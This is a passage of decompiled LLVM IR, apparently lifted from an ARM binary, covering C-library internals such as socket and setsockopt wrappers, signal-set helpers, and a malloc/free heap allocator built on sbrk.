  br i1 %tmp, label %dec_label_pc_14af8, label %dec_label_pc_14ae8

dec_label_pc_14ae8:                               ; preds = %entry
  %v0_14ae8 = call i32 @__errno_location()
  %v0_14aec = load i32, i32* %r4.global-to-local, align 4
  %v1_14aec = sub i32 0, %v0_14aec
  %v2_14af0 = inttoptr i32 %v0_14ae8 to i32*
  store i32 %v1_14aec, i32* %v2_14af0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14af8

dec_label_pc_14af8:                               ; preds = %entry, %dec_label_pc_14ae8
  %v0_14af8 = phi i32 [ %v5_14ad8, %entry ], [ -1, %dec_label_pc_14ae8 ]
  %v2_14afc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14afc, i32* @r4, align 4
  ret i32 %v0_14af8

; uselistorder directives
  uselistorder i32 %v5_14ad8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14af8, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b00 = load i32, i32* @r4, align 4
  store i32 %v3_14b00, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_14b08 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_14b08, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14b08, -4095
  br i1 %tmp, label %dec_label_pc_14b28, label %dec_label_pc_14b18

dec_label_pc_14b18:                               ; preds = %entry
  %v0_14b18 = call i32 @__errno_location()
  %v0_14b1c = load i32, i32* %r4.global-to-local, align 4
  %v1_14b1c = sub i32 0, %v0_14b1c
  %v2_14b20 = inttoptr i32 %v0_14b18 to i32*
  store i32 %v1_14b1c, i32* %v2_14b20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b28

dec_label_pc_14b28:                               ; preds = %entry, %dec_label_pc_14b18
  %v0_14b28 = phi i32 [ %v5_14b08, %entry ], [ -1, %dec_label_pc_14b18 ]
  %v2_14b2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b2c, i32* @r4, align 4
  ret i32 %v0_14b28

; uselistorder directives
  uselistorder i32 %v5_14b08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b28, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b30 = load i32, i32* @r4, align 4
  store i32 %v3_14b30, i32* %stack_var_-8, align 4
  %v0_14b34 = call i32 @socket()
  store i32 %v0_14b34, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b34, -4095
  br i1 %tmp, label %dec_label_pc_14b54, label %dec_label_pc_14b44

dec_label_pc_14b44:                               ; preds = %entry
  %v0_14b44 = call i32 @__errno_location()
  %v0_14b48 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b48 = sub i32 0, %v0_14b48
  %v2_14b4c = inttoptr i32 %v0_14b44 to i32*
  store i32 %v1_14b48, i32* %v2_14b4c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b54

dec_label_pc_14b54:                               ; preds = %entry, %dec_label_pc_14b44
  %v0_14b54 = phi i32 [ %v0_14b34, %entry ], [ -1, %dec_label_pc_14b44 ]
  %v2_14b58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b58, i32* @r4, align 4
  ret i32 %v0_14b54

; uselistorder directives
  uselistorder i32 %v0_14b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b54, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_14b78, label %dec_label_pc_14b68

dec_label_pc_14b68:                               ; preds = %entry
  %v8_14b6c = icmp sgt i32 %arg1, 64
  br i1 %v8_14b6c, label %dec_label_pc_14b78, label %dec_label_pc_14b70

dec_label_pc_14b70:                               ; preds = %dec_label_pc_14b68
  %v0_14b74 = call i32 @__sigaddset()
  br label %dec_label_pc_14b78

dec_label_pc_14b78:                               ; preds = %dec_label_pc_14b68, %entry, %dec_label_pc_14b70
  %v0_14b78 = call i32 @__errno_location()
  %v2_14b80 = inttoptr i32 %v0_14b78 to i32*
  store i32 22, i32* %v2_14b80, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b78, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_14b98 = load i32, i32* @r0, align 4
  %v2_14b98 = inttoptr i32 %v0_14b98 to i8*
  %v3_14b98 = call i32 @__GI_memset(i8* %v2_14b98, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14ba4 = load i32, i32* @r4, align 4
  store i32 %v3_14ba4, i32* %stack_var_-12, align 4
  %v6_14ba4 = load i32, i32* @r5, align 4
  %v10_14ba4 = ptrtoint i32* %stack_var_-12 to i32
  %v7_14ba8 = icmp eq i32 %arg2, -1
  %v0_14bb4.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_14ba8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_14bcc

bb:                                               ; preds = %entry
  %v2_14bb0 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_14bb4.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_14bb4.pre, 1
  br i1 %tmp19, label %dec_label_pc_14bcc, label %dec_label_pc_14bbc

dec_label_pc_14bbc:                               ; preds = %bb
  %v7_14bc0 = icmp sgt i32 %v0_14bb4.pre, 64
  br i1 %v7_14bc0, label %dec_label_pc_14bcc, label %bb20

bb20:                                             ; preds = %dec_label_pc_14bbc
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_14bf024 = add i32 %v10_14ba4, 124
  store i32 %v5_14bf024, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14be0

dec_label_pc_14bcc:                               ; preds = %.thread, %dec_label_pc_14bbc, %bb
  %v0_14bcc = call i32 @__errno_location()
  store i32 %v0_14bcc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14bd8 = inttoptr i32 %v0_14bcc to i32*
  store i32 22, i32* %v2_14bd8, align 4
  %v0_14c4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14c4c

dec_label_pc_14be0:                               ; preds = %bb20, %dec_label_pc_14be0
  %v5_14bf025 = phi i32 [ %v5_14bf024, %bb20 ], [ %v5_14bf0, %dec_label_pc_14be0 ]
  %v2_14be4 = add i32 %v5_14bf025, -136
  %v3_14be4 = inttoptr i32 %v2_14be4 to i32*
  store i32 0, i32* %v3_14be4, align 4
  %v0_14be8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14be8 = add i32 %v0_14be8.pre, -1
  store i32 %v1_14be8, i32* %r0.global-to-local, align 4
  %v6_14be8 = icmp slt i32 %v1_14be8, 0
  %v4_14bf0 = mul i32 %v1_14be8, 4
  %v5_14bf0 = add i32 %v4_14bf0, %v10_14ba4
  store i32 %v5_14bf0, i32* %r2.global-to-local, align 4
  br i1 %v6_14be8, label %dec_label_pc_14bf8, label %dec_label_pc_14be0

dec_label_pc_14bf8:                               ; preds = %dec_label_pc_14be0
  %v2_14bf8 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_14bf8, i32* @r5, align 4
  %v2_14bfc = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_14bfc, i32* @r0, align 4
  %v0_14c00 = load i32, i32* @r4, align 4
  store i32 %v0_14c00, i32* @r1, align 4
  %v0_14c04 = call i32 @__sigaddset()
  store i32 %v0_14c04, i32* %r0.global-to-local, align 4
  %v1_14c08 = icmp slt i32 %v0_14c04, 0
  br i1 %v1_14c08, label %dec_label_pc_14c48, label %dec_label_pc_14c10

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14bf8
  %v0_14c10 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2fb98.1124 to i32), i32* %r0.global-to-local, align 4
  %v2_14c18 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_2fb98.1124 to i32), i32 %v0_14c10)
  store i32 %v2_14bb0, i32* %r2.global-to-local, align 4
  %v0_14c30 = load i32, i32* @r4, align 4
  store i32 %v0_14c30, i32* %r0.global-to-local, align 4
  %v4_14c38 = call i32 @__libc_sigaction(i32 %v0_14c30, i32* nonnull %stack_var_-152, i32 %v2_14bb0)
  store i32 %v4_14c38, i32* %r0.global-to-local, align 4
  %v1_14c3c = icmp slt i32 %v4_14c38, 0
  br i1 %v1_14c3c, label %dec_label_pc_14c48, label %bb23

bb23:                                             ; preds = %dec_label_pc_14c10
  %v5_14c40 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_14c40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14c4c

dec_label_pc_14c48:                               ; preds = %dec_label_pc_14c10, %dec_label_pc_14bf8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14c4c

dec_label_pc_14c4c:                               ; preds = %bb23, %dec_label_pc_14bcc, %dec_label_pc_14c48
  %v0_14c4c = phi i32 [ %v5_14c40, %bb23 ], [ %v0_14c4c.pre, %dec_label_pc_14bcc ], [ -1, %dec_label_pc_14c48 ]
  store i32 %v0_14c4c, i32* %r0.global-to-local, align 4
  %v2_14c54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14c54, i32* @r4, align 4
  store i32 %v6_14ba4, i32* @r5, align 4
  ret i32 %v0_14c4c

; uselistorder directives
  uselistorder i32 %v0_14c4c, { 1, 0 }
  uselistorder i32 %v5_14bf0, { 1, 0 }
  uselistorder i32 %v1_14be8, { 0, 2, 1 }
  uselistorder i32 %v2_14bb0, { 1, 0 }
  uselistorder i32 %v0_14bb4.pre, { 1, 0, 2 }
  uselistorder i32 %v10_14ba4, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14c4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14be0, { 1, 0 }
  uselistorder label %dec_label_pc_14bcc, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14c5c = add i32 %arg2, -1
  %v3_14c60 = udiv i32 %v1_14c5c, 32
  %v4_14c64 = mul nuw nsw i32 %v3_14c60, 4
  %v5_14c64 = add i32 %v4_14c64, %arg1
  %v6_14c64 = inttoptr i32 %v5_14c64 to i32*
  %v7_14c64 = load i32, i32* %v6_14c64, align 4
  %v1_14c68 = urem i32 %v1_14c5c, 32
  %v7_14c70 = shl i32 1, %v1_14c68
  %v8_14c70 = and i32 %v7_14c64, %v7_14c70
  %v10_14c70 = icmp ne i32 %v8_14c70, 0
  %. = zext i1 %v10_14c70 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_14c5c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_14c80 = load i32, i32* @r1, align 4
  %v1_14c80 = add i32 %v0_14c80, -1
  %v3_14c84 = udiv i32 %v1_14c80, 32
  %v0_14c88 = load i32, i32* @r0, align 4
  %v4_14c88 = mul nuw nsw i32 %v3_14c84, 4
  %v5_14c88 = add i32 %v0_14c88, %v4_14c88
  %v6_14c88 = inttoptr i32 %v5_14c88 to i32*
  %v7_14c88 = load i32, i32* %v6_14c88, align 4
  %v1_14c8c = urem i32 %v1_14c80, 32
  %v7_14c94 = shl i32 1, %v1_14c8c
  %v8_14c94 = or i32 %v7_14c88, %v7_14c94
  store i32 %v8_14c94, i32* %v6_14c88, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14c80, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14ca4 = add i32 %arg2, -1
  %v3_14ca8 = udiv i32 %v1_14ca4, 32
  %v4_14cac = mul nuw nsw i32 %v3_14ca8, 4
  %v5_14cac = add i32 %v4_14cac, %arg1
  %v6_14cac = inttoptr i32 %v5_14cac to i32*
  %v7_14cac = load i32, i32* %v6_14cac, align 4
  %v1_14cb0 = urem i32 %v1_14ca4, 32
  %tmp = shl i32 -1, %v1_14cb0
  %v8_14cb8 = add i32 %tmp, -1
  %v9_14cb8 = and i32 %v7_14cac, %v8_14cb8
  store i32 %v9_14cb8, i32* %v6_14cac, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14ca4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14cc8 = load i32, i32* @r4, align 4
  %v6_14cc8 = load i32, i32* @r5, align 4
  %v9_14cc8 = load i32, i32* @r6, align 4
  %v0_14ccc = load i32, i32* %r0.global-to-local, align 4
  %v2_14ccc = icmp eq i32 %v0_14ccc, 0
  %v2_14cd0 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_14ccc, label %bb, label %dec_label_pc_14cdc

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ce4

dec_label_pc_14cdc:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_14ccc, -8
  br i1 %tmp, label %dec_label_pc_14de8, label %dec_label_pc_14ce4

dec_label_pc_14ce4:                               ; preds = %bb, %dec_label_pc_14cdc
  %v0_14ce4 = phi i32 [ %v0_14ccc, %dec_label_pc_14cdc ], [ 1, %bb ]
  %v1_14ce4 = add i32 %v0_14ce4, 4
  store i32 %v1_14ce4, i32* %stack_var_-20, align 4
  store i32 %v2_14cd0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2fb28.1126 to i32), i32* %r0.global-to-local, align 4
  %v1_14cfc = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_296dc.1130 to i32), i32* %r0.global-to-local, align 4
  %v3_14d08 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_296dc.1130 to i32*), i32 %v2_14cd0)
  store i32 %v3_14d08, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2fb28.1126 to i32), i32* %r0.global-to-local, align 4
  store i32 85280, i32* @lr, align 4
  %v1_14d1c = call i32 @__pthread_return_0()
  store i32 %v1_14d1c, i32* %r0.global-to-local, align 4
  %v2_14d20 = icmp eq i32 %v3_14d08, 0
  br i1 %v2_14d20, label %dec_label_pc_14d28, label %dec_label_pc_14dd8

dec_label_pc_14d28:                               ; preds = %dec_label_pc_14ce4
  %v2_14d2c = load i32, i32* @global_var_2fb50.1133, align 4
  store i32 %v2_14d2c, i32* @r4, align 4
  %v2_14d30 = load i32, i32* %stack_var_-20, align 4
  %v3_14d34 = icmp ult i32 %v2_14d30, %v2_14d2c
  br i1 %v3_14d34, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_14d28
  %v3_14d38 = add i32 %v2_14d2c, -1
  %v2_14d3c = add i32 %v3_14d38, %v2_14d30
  %v2_14d40 = sub i32 0, %v2_14d2c
  %v3_14d44 = and i32 %v2_14d3c, %v2_14d40
  store i32 %v3_14d44, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14d28, %bb14
  store i32 ptrtoint (i32* @global_var_2fc18.1135 to i32), i32* %r0.global-to-local, align 4
  %v1_14d50 = call i32 @__pthread_return_0()
  %v0_14d54 = load i32, i32* @r4, align 4
  store i32 %v0_14d54, i32* %r0.global-to-local, align 4
  %v1_14d58 = call i32 @__GI_sbrk(i32 %v0_14d54)
  store i32 %v1_14d58, i32* %r0.global-to-local, align 4
  %v7_14d5c = icmp eq i32 %v1_14d58, -1
  br i1 %v7_14d5c, label %bb15, label %dec_label_pc_14d68

bb15:                                             ; preds = %.thread3
  store i32 %v1_14d58, i32* @r5, align 4
  br label %dec_label_pc_14d7c

dec_label_pc_14d68:                               ; preds = %.thread3
  %v1_14d68 = add i32 %v1_14d58, 3
  %v1_14d6c = and i32 %v1_14d68, -4
  store i32 %v1_14d6c, i32* @r5, align 4
  %v9_14d70 = icmp eq i32 %v1_14d6c, %v1_14d58
  br i1 %v9_14d70, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_14d68
  %v3_14d74 = sub i32 %v1_14d6c, %v1_14d58
  store i32 %v3_14d74, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14d68, %bb16
  %v1_14d78 = xor i1 %v9_14d70, true
  call void @__pseudo_cond_branch(i1 %v1_14d78, i32 ptrtoint (i32* @global_var_1622c.1136 to i32))
  br label %dec_label_pc_14d7c

dec_label_pc_14d7c:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_2fc18.1135 to i32), i32* %r0.global-to-local, align 4
  store i32 85388, i32* @lr, align 4
  %v1_14d88 = call i32 @__pthread_return_0()
  store i32 %v1_14d88, i32* %r0.global-to-local, align 4
  %v0_14d8c = load i32, i32* @r5, align 4
  %v7_14d8c = icmp eq i32 %v0_14d8c, -1
  br i1 %v7_14d8c, label %dec_label_pc_14de8, label %dec_label_pc_14d94

dec_label_pc_14d94:                               ; preds = %dec_label_pc_14d7c
  store i32 ptrtoint (i32* @global_var_2fb28.1126 to i32), i32* %r0.global-to-local, align 4
  %v1_14da0 = call i32 @__pthread_return_0()
  %v0_14da4 = load i32, i32* @r4, align 4
  %v0_14da8 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_296dc.1130 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_14da8, 16777216
  %v2_14db0 = sdiv i32 %sext, 16777216
  %v5_14db0 = call i32 @__heap_free(i32* bitcast (i32** @global_var_296dc.1130 to i32*), i32 %v2_14db0, i32 %v0_14da4)
  store i32 ptrtoint (i32** @global_var_296dc.1130 to i32), i32* %r0.global-to-local, align 4
  %v3_14dbc = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_296dc.1130 to i32*), i32 %v2_14cd0)
  store i32 %v3_14dbc, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2fb28.1126 to i32), i32* %r0.global-to-local, align 4
  store i32 85456, i32* @lr, align 4
  %v1_14dcc = call i32 @__pthread_return_0()
  store i32 %v1_14dcc, i32* %r0.global-to-local, align 4
  %v2_14dd0 = icmp eq i32 %v3_14dbc, 0
  br i1 %v2_14dd0, label %dec_label_pc_14de8, label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14ce4, %dec_label_pc_14d94
  %v1_14ddc = phi i32 [ %v3_14d08, %dec_label_pc_14ce4 ], [ %v3_14dbc, %dec_label_pc_14d94 ]
  %v2_14dd8 = load i32, i32* %stack_var_-20, align 4
  %v2_14ddc = inttoptr i32 %v1_14ddc to i32*
  store i32 %v2_14dd8, i32* %v2_14ddc, align 4
  %v3_14ddc = load i32, i32* %r4.global-to-local, align 4
  %v4_14ddc = add i32 %v3_14ddc, 4
  store i32 %v4_14ddc, i32* %r4.global-to-local, align 4
  %v2_14de0 = icmp eq i32 %v4_14ddc, 0
  br i1 %v2_14de0, label %dec_label_pc_14de8, label %dec_label_pc_14df8

dec_label_pc_14de8:                               ; preds = %dec_label_pc_14dd8, %dec_label_pc_14d94, %dec_label_pc_14d7c, %dec_label_pc_14cdc
  %v0_14de8 = call i32 @__errno_location()
  store i32 %v0_14de8, i32* %r0.global-to-local, align 4
  %v2_14df0 = inttoptr i32 %v0_14de8 to i32*
  store i32 12, i32* %v2_14df0, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14df8

dec_label_pc_14df8:                               ; preds = %dec_label_pc_14dd8, %dec_label_pc_14de8
  %v0_14df8 = phi i32 [ %v4_14ddc, %dec_label_pc_14dd8 ], [ 0, %dec_label_pc_14de8 ]
  store i32 %v0_14df8, i32* %r0.global-to-local, align 4
  store i32 %v3_14cc8, i32* @r4, align 4
  store i32 %v6_14cc8, i32* @r5, align 4
  store i32 %v9_14cc8, i32* @r6, align 4
  ret i32 %v0_14df8

; uselistorder directives
  uselistorder i32 %v0_14df8, { 1, 0 }
  uselistorder i32 %v3_14dbc, { 1, 0, 2 }
  uselistorder i32 %v1_14d6c, { 1, 0, 2 }
  uselistorder i32 %v1_14d58, { 2, 0, 4, 3, 1, 5 }
  uselistorder i32 %v3_14d08, { 1, 0, 2 }
  uselistorder i32 %v0_14ccc, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 3, 12, 11, 16, 14, 13, 2, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_14df8, { 1, 0 }
  uselistorder label %dec_label_pc_14dd8, { 1, 0 }
  uselistorder label %dec_label_pc_14d7c, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14ce4, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_14e1c = icmp eq i32 %arg1, 0
  %v3_14e20 = load i32, i32* @r4, align 4
  store i32 %v3_14e20, i32* %stack_var_-24, align 4
  %v6_14e20 = load i32, i32* @r5, align 4
  %v9_14e20 = load i32, i32* @r6, align 4
  %v15_14e20 = load i32, i32* @r8, align 4
  br i1 %v2_14e1c, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_14e28 = add i32 %arg1, -4
  %v2_14e28 = inttoptr i32 %v1_14e28 to i32*
  %v3_14e28 = load i32, i32* %v2_14e28, align 4
  store i32 %v3_14e28, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_296dc.1130 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_14e28, i32* @r4, align 4
  %v1_14e40 = call i32 @__pthread_return_0()
  %v0_14e44 = load i32, i32* @r4, align 4
  %v0_14e48 = load i32, i32* @r5, align 4
  %v4_14e50 = call i32 @__heap_free(i32* bitcast (i32** @global_var_296dc.1130 to i32*), i32 %v0_14e44, i32 %v0_14e48)
  %v1_14e58 = inttoptr i32 %v4_14e50 to i32*
  %v2_14e58 = load i32, i32* %v1_14e58, align 4
  store i32 %v2_14e58, i32* %r6.global-to-local, align 4
  %v2_14e5c = load i32, i32* @global_var_2fb50.1133, align 4
  %v4_14e60 = mul i32 %v2_14e5c, 8
  %v6_14e60 = icmp ult i32 %v2_14e58, %v4_14e60
  store i32 %v4_14e50, i32* @r4, align 4
  br i1 %v6_14e60, label %dec_label_pc_14ea0, label %dec_label_pc_14e6c

dec_label_pc_14e6c:                               ; preds = %bb11
  %v1_14e74 = call i32 @__pthread_return_0()
  %v1_14e7c = call i32 @__GI_sbrk(i32 0)
  %v0_14e80 = load i32, i32* @r4, align 4
  %v1_14e80 = add i32 %v0_14e80, 12
  store i32 %v1_14e80, i32* @r5, align 4
  %v9_14e84 = icmp eq i32 %v1_14e80, %v1_14e7c
  br i1 %v9_14e84, label %dec_label_pc_14ea8, label %dec_label_pc_14e8c

dec_label_pc_14e8c:                               ; preds = %dec_label_pc_14e6c
  %v1_14e98 = call i32 @__pthread_return_0()
  br label %dec_label_pc_14ea0

dec_label_pc_14ea0:                               ; preds = %bb11, %dec_label_pc_14e8c, %bb14
  %v2_14ea0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14ea0, i32* @r4, align 4
  store i32 %v6_14e20, i32* @r5, align 4
  store i32 %v9_14e20, i32* %r6.global-to-local, align 4
  store i32 %v15_14e20, i32* %r8.global-to-local, align 4
  %v0_14ea4 = call i32 @__pthread_return_0()
  %v0_14ea8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14ea8

dec_label_pc_14ea8:                               ; preds = %dec_label_pc_14e6c, %dec_label_pc_14ea0
  %v1_14eb0 = phi i32 [ %v0_14e80, %dec_label_pc_14e6c ], [ %v0_14ea8.pre, %dec_label_pc_14ea0 ]
  %v1_14ea8 = add i32 %v1_14eb0, 4
  %v2_14ea8 = inttoptr i32 %v1_14ea8 to i32*
  %v3_14ea8 = load i32, i32* %v2_14ea8, align 4
  %v2_14eac = icmp eq i32 %v3_14ea8, 0
  br i1 %v2_14eac, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_14ea8
  %v2_14eb0 = add i32 %v1_14eb0, 8
  %v3_14eb0 = inttoptr i32 %v2_14eb0 to i32*
  %v4_14eb0 = load i32, i32* %v3_14eb0, align 4
  %v3_14eb4 = add i32 %v3_14ea8, 8
  %v4_14eb4 = inttoptr i32 %v3_14eb4 to i32*
  store i32 %v4_14eb0, i32* %v4_14eb4, align 4
  %v0_14eb8.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14ea8, %bb12
  %v0_14eb8 = phi i32 [ %v1_14eb0, %dec_label_pc_14ea8 ], [ %v0_14eb8.pre, %bb12 ]
  %v1_14eb8 = add i32 %v0_14eb8, 8
  %v2_14eb8 = inttoptr i32 %v1_14eb8 to i32*
  %v3_14eb8 = load i32, i32* %v2_14eb8, align 4
  %v1_14ebc = add i32 %v0_14eb8, 4
  %v2_14ebc = inttoptr i32 %v1_14ebc to i32*
  %v3_14ebc = load i32, i32* %v2_14ebc, align 4
  %v2_14ec0 = icmp eq i32 %v3_14eb8, 0
  br i1 %v2_14ec0, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_14ec4 = add i32 %v3_14eb8, 4
  %v4_14ec4 = inttoptr i32 %v3_14ec4 to i32*
  store i32 %v3_14ebc, i32* %v4_14ec4, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_14ec8 = load i32, i32* %r8.global-to-local, align 4
  %v3_14ec8 = inttoptr i32 %v2_14ec8 to i32*
  store i32 %v3_14ebc, i32* %v3_14ec8, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_14ed8 = call i32 @__pthread_return_0()
  %v0_14edc = load i32, i32* %r6.global-to-local, align 4
  %v1_14edc = load i32, i32* @r4, align 4
  %v0_14ee4 = load i32, i32* @r5, align 4
  %v2_14edc = sub i32 12, %v0_14edc
  %v1_14ee0 = add i32 %v2_14edc, %v1_14edc
  %v2_14ee4 = sub i32 %v1_14ee0, %v0_14ee4
  %v1_14ee8 = call i32 @__GI_sbrk(i32 %v2_14ee4)
  br label %dec_label_pc_14ea0

; uselistorder directives
  uselistorder i32 %v0_14eb8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 1, 0 }
  uselistorder i32** @global_var_296dc.1130, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14ea8, { 1, 0 }
  uselistorder label %dec_label_pc_14ea0, { 2, 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_14f0c = inttoptr i32 %arg2 to i32*
  %v2_14f0c = load i32, i32* %v1_14f0c, align 4
  %v3_14f10 = load i32, i32* @r4, align 4
  store i32 %v3_14f10, i32* %stack_var_-8, align 4
  %v1_14f14 = add i32 %v2_14f0c, 3
  %v1_14f18 = and i32 %v1_14f14, -4
  store i32 %v1_14f18, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_14f20 = icmp ugt i32 %v1_14f18, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_14f28 = load i32, i32* %arg1, align 4
  store i32 %v2_14f28, i32* %r0.global-to-local, align 4
  br i1 %v2_14f20, label %dec_label_pc_14f94.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14f94.preheader

dec_label_pc_14f94.preheader:                     ; preds = %entry, %bb
